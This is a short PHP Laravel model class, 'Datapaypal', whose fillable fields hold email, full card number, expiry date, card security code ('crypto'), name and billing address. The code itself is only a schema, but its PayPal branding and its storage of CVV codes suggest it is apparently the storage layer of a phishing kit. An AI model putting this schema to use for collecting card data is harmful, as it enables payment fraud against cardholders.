<?php

namespace App;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Notifications\Notifiable;

class Datapaypal extends Model
{
     use Notifiable;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        
         'email','country','carte','numero','date','crypto','prenom','nom','adresse1','adresse2','postal',
    ];

    
    
    protected $hidden = [
        'remember_token',
    ];
}
